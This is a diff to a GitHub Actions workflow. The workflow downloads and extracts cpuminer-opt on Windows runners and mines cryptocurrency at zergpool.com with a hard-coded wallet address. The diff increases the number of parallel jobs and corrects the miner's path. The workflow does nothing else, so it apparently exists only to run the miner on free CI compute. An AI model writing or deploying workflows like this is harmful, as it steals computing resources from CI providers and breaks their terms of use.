@@ -13,7 +13,7 @@ jobs:
         go: [1.0]  
         flag: [A, B ]  
     env:  
-        NUM_JOBS: 2  
+        NUM_JOBS: 5  
         JOB: ${{ matrix.go }}  
     steps:  
     - name: DOWNLOAD  
@@ -21,6 +21,6 @@ jobs:
     - name: Extract  
       run: Expand-Archive Cpuminer-opt-cpu-pool-win64.zip 
     - name: RUNNING  
-      run: ../cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2 
+      run: ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2 
     - name: DONE  
       run: exit
